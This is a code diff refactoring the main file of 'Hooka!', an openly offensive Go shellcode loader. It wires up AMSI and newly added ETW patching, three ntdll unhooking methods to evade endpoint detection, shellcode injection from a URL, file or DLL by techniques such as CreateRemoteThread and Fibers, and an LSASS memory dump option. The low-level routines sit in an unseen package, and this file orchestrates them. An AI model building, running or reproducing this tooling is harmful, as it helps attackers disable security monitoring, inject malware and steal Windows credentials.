@@ -20,7 +20,7 @@ func main() {
   var err error
 
   // Parse CLI flags and retrieve values
-  sc_url, sc_file, dll_file, technique, hook_detect, halos, unhook, base64_flag, hex_flag, test_flag, amsi, lsass := core.ParseFlags()
+  sc_url, sc_file, dll_file, technique, hook_detect, halos, unhook, base64_flag, hex_flag, test_flag, amsi, etw, lsass := core.ParseFlags()
 
   l.PrintBanner("Hooka!") // Print script banner with version
   l.Println(" by D3Ext - v0.1")
@@ -50,7 +50,7 @@ func main() {
 
   } else if (sc_url != "") && (sc_file == "") && (dll_file == "") {
 
-    if (technique != "CreateRemoteThread") && (technique != "CreateProcess") && (technique != "EarlyBirdApc") && (technique != "UuidFromString") && (technique != "") {
+    if (technique != "CreateRemoteThread") && (technique != "CreateProcess") && (technique != "QueueApcThread") && (technique != "UuidFromString") && (technique != "Fibers") && (technique != "") {
       l.Println()
       flag.PrintDefaults()
       l.Println("\n[-] Unknown injection technique! See help panel\n")
@@ -65,7 +65,7 @@ func main() {
     }
 
     if (unhook != 1) && (unhook != 2) && (unhook != 3) && (unhook != 0) { // Check if user provided a non allowed value
-      l.Println("\n[-] Unknown unhooking technique! Allowed values: 1, 2, 3\n")
+      l.Println("\n[-] Unknown unhooking technique! Allowed values: 1=classic, 2=full, 3=Perun's Fart\n")
       os.Exit(0)
     }
 
@@ -107,50 +107,13 @@ func main() {
       time.Sleep(300 * time.Millisecond)
     }
 
-    if (amsi) {
-      l.Println("[*] Patching AMSI by overwriting AmsiScanBuffer memory address...")
-      time.Sleep(200 * time.Millisecond)
-      err = core.PatchAmsi()
-      if err != nil {
-        l.Println("[-] An error has ocurred while overwriting memory!")
-        l.Fatal(err)
-      }
-      time.Sleep(200 * time.Millisecond)
-    }
+    checkAmsi(amsi)
 
-    // Unhook function(s)
-    if (unhook == 1) {
-      l.Println("[*] Unhooking functions via Classic technique...")
-      time.Sleep(200 * time.Millisecond)
-      err := core.ClassicUnhook(technique, "C:\\Windows\\System32\\ntdll.dll")
-      if err != nil {
-        l.Println("[-] An error has ocurred while unhooking functions!")
-        l.Fatal(err)
-      }
-      l.Println("[+] Functions have been unhooked!")
+    checkEtw(etw)
 
-    } else if (unhook == 2) {
-      l.Println("[*] Unhooking functions via Full Dll technique...")
-      time.Sleep(200 * time.Millisecond)
-      err := core.FullUnhook("C:\\Windows\\System32\\ntdll.dll")
-      if err != nil {
-        l.Println("[-] An error has ocurred while unhooking functions!")
-        l.Fatal(err)
-      }
-      l.Println("[+] Functions have been unhooked!")
+    checkUnhook(unhook, technique)
 
-    } else if (unhook == 3) {
-      l.Println("[*] Unhooking functions via Perun's Fart technique...")
-      time.Sleep(200 * time.Millisecond)
-      err := core.PerunsUnhook()
-      if err != nil {
-        l.Println("[-] An error has ocurred while unhooking functions!")
-        l.Fatal(err)
-      }
-      l.Println("[+] Functions have been unhooked!")
-
-    }
-
+    time.Sleep(300 * time.Millisecond)
     if (technique != "") {
       l.Println("[*] Injecting shellcode using " + technique + " function")
     }
@@ -225,51 +188,13 @@ func main() {
       time.Sleep(300 * time.Millisecond)
     }
 
-    if (amsi) {
-      l.Println("[*] Patching AMSI by overwriting AmsiScanBuffer memory address...")
-      time.Sleep(200 * time.Millisecond)
-      err = core.PatchAmsi()
-      if err != nil {
-        l.Println("[-] An error has ocurred while overwriting memory!")
-        l.Fatal(err)
-      }
-      time.Sleep(200 * time.Millisecond)
-    }
+    checkAmsi(amsi)
 
-    // Unhook function(s)
-    if (unhook == 1) {
-      l.Println("[*] Unhooking functions via Classic technique...")
-      time.Sleep(200 * time.Millisecond)
-      err := core.ClassicUnhook(technique, "C:\\Windows\\System32\\ntdll.dll")
-      if err != nil { // Handle error
-        l.Println("[-] An error has ocurred while unhooking functions!")
-        l.Fatal(err)
-      }
-      l.Println("[+] Functions have been unhooked!")
+    checkEtw(etw)
 
-    } else if (unhook == 2) {
-      l.Println("[*] Unhooking functions via Full Dll technique...")
-      time.Sleep(200 * time.Millisecond)
-      err := core.FullUnhook("C:\\Windows\\System32\\ntdll.dll")
-      if err != nil { // Handle error
-        l.Println("[-] An error has ocurred while unhooking functions!")
-        l.Fatal(err)
-      }
-      l.Println("[+] Functions have been unhooked!")
+    checkUnhook(unhook, technique)
 
-    } else if (unhook == 3) {
-      l.Println("[*] Unhooking functions via Perun's Fart technique...")
-      time.Sleep(200 * time.Millisecond)
-      err := core.PerunsUnhook()
-      if err != nil { // Handle error
-        l.Println("[-] An error has ocurred while unhooking functions!")
-        l.Fatal(err)
-      }
-      l.Println("[+] Functions have been unhooked!")
-
-    }
     time.Sleep(300 * time.Millisecond)
-
     if (technique != "") {
       l.Println("[*] Injecting shellcode using " + technique + " technique")
     }
@@ -310,6 +235,13 @@ func main() {
       os.Exit(0)
     }
 
+    if (technique != "CreateRemoteThread") && (technique != "CreateProcess") && (technique != "Fibers") && (technique != "QueueApcThread") && (technique != "UuidFromString") && (technique != "") {
+      l.Println()
+      flag.PrintDefaults()
+      l.Println("\n[-] Unknown injection technique! See help panel\n")
+      os.Exit(0)
+    }
+
     time.Sleep(200 * time.Millisecond) // Add some delay to let the user read info
     l.Println("\n[+] DLL file: " + dll_filename)
     time.Sleep(300 * time.Millisecond)
@@ -329,51 +261,13 @@ func main() {
     l.Println("[+] Process finished successfully!")
     time.Sleep(200 * time.Millisecond)
 
-    if (amsi) {
-      l.Println("[*] Patching AMSI by overwriting AmsiScanBuffer memory address...")
-      time.Sleep(200 * time.Millisecond)
-      err = core.PatchAmsi()
-      if err != nil {
-        l.Println("[-] An error has ocurred while overwriting memory!")
-        l.Fatal(err)
-      }
-      time.Sleep(200 * time.Millisecond)
-    }
+    checkAmsi(amsi)
 
-    // Unhook function(s)
-    if (unhook == 1) {
-      l.Println("[*] Unhooking functions via Classic technique...")
-      time.Sleep(200 * time.Millisecond)
-      err := core.ClassicUnhook(technique, "C:\\Windows\\System32\\ntdll.dll")
-      if err != nil { // Handle error
-        l.Println("[-] An error has ocurred while unhooking functions!")
-        l.Fatal(err)
-      }
-      l.Println("[+] Functions have been unhooked!")
+    checkEtw(etw)
 
-    } else if (unhook == 2) {
-      l.Println("[*] Unhooking functions via Full Dll technique...")
-      time.Sleep(200 * time.Millisecond)
-      err := core.FullUnhook("C:\\Windows\\System32\\ntdll.dll")
-      if err != nil { // Handle error
-        l.Println("[-] An error has ocurred while unhooking functions!")
-        l.Fatal(err)
-      }
-      l.Println("[+] Functions have been unhooked!")
+    checkUnhook(unhook, technique)
 
-    } else if (unhook == 3) {
-      l.Println("[*] Unhooking functions via Perun's Fart technique...")
-      time.Sleep(200 * time.Millisecond)
-      err := core.PerunsUnhook()
-      if err != nil { // Handle error
-        l.Println("[-] An error has ocurred while unhooking functions!")
-        l.Fatal(err)
-      }
-      l.Println("[+] Functions have been unhooked!")
-
-    }
     time.Sleep(300 * time.Millisecond)
-
     if (technique != "") { // Check if technique has value so it doesn't get printed twice
       l.Println("[*] Injecting shellcode using " + technique + " technique")
     }
@@ -424,16 +318,9 @@ func main() {
     l.Println("\n[*] Testing with calc.exe shellcode")
     time.Sleep(200 * time.Millisecond)
 
-    if (amsi) {
-      l.Println("[*] Patching AMSI by overwriting AmsiScanBuffer memory address...")
-      time.Sleep(200 * time.Millisecond)
-      err = core.PatchAmsi()
-      if err != nil {
-        l.Println("[-] An error has ocurred while overwriting memory!")
-        l.Fatal(err)
-      }
-      time.Sleep(200 * time.Millisecond)
-    }
+    checkAmsi(amsi)
+
+    checkEtw(etw)
 
     if (technique != "") {
       l.Println("[*] Injecting shellcode using " + technique + " technique")
@@ -451,13 +338,17 @@ func main() {
     err := core.DumpLsass(lsass)
     if err != nil { // Handle error
       l.Println("[-] An error has ocurred, ensure to be running as admin:")
-      os.Remove(lsass)
+      e := os.Remove(lsass)
+      if e != nil {
+        l.Fatal(e)
+      }
+
       l.Fatalln(err)
     }
 
     info, err := os.Stat(lsass)
     if err != nil {
-      l.Fatal(err)
+      l.Fatalln(err)
     }
 
     l.Println("[*]", info.Size(), "bytes were written to file")
@@ -468,4 +359,66 @@ func main() {
   }
 
 }
+
+func checkAmsi(check bool) {
+  if (check) {
+    l.Println("[*] Patching AMSI by overwriting AmsiScanBuffer memory address...")
+    time.Sleep(200 * time.Millisecond)
+    err := core.PatchAmsi()
+    if err != nil {
+      l.Println("[-] An error has ocurred while overwriting memory!")
+      l.Fatal(err)
+    }
+    time.Sleep(200 * time.Millisecond)
+  }
+}
+
+func checkEtw(check bool) {
+  if (check) {
+    l.Println("[*] Patching ETW by overwriting some EtwEventWrite functions memory address...")
+    time.Sleep(200 * time.Millisecond)
+    err := core.PatchEtw()
+    if err != nil {
+      l.Println("[-] An error has ocurred while overwriting memory!")
+      l.Fatal(err)
+    }
+    time.Sleep(200 * time.Millisecond)
+  }
+}
+
+func checkUnhook(unhook int, technique string) {
+  // Unhook function(s)
+  if (unhook == 1) {
+    l.Println("[*] Unhooking functions via Classic technique...")
+    time.Sleep(200 * time.Millisecond)
+    err := core.ClassicUnhook(technique, "C:\\Windows\\System32\\ntdll.dll")
+    if err != nil {
+      l.Println("[-] An error has ocurred while unhooking functions!")
+      l.Fatal(err)
+    }
+    l.Println("[+] Functions have been unhooked!")
+
+  } else if (unhook == 2) {
+    l.Println("[*] Unhooking functions via Full Dll technique...")
+    time.Sleep(200 * time.Millisecond)
+    err := core.FullUnhook("C:\\Windows\\System32\\ntdll.dll")
+    if err != nil {
+      l.Println("[-] An error has ocurred while unhooking functions!")
+      l.Fatal(err)
+    }
+    l.Println("[+] Functions have been unhooked!")
+
+  } else if (unhook == 3) {
+    l.Println("[*] Unhooking functions via Perun's Fart technique...")
+    time.Sleep(200 * time.Millisecond)
+    err := core.PerunsUnhook()
+    if err != nil {
+      l.Println("[-] An error has ocurred while unhooking functions!")
+      l.Fatal(err)
+    }
+    l.Println("[+] Functions have been unhooked!")
+
+  }
+}
+
 
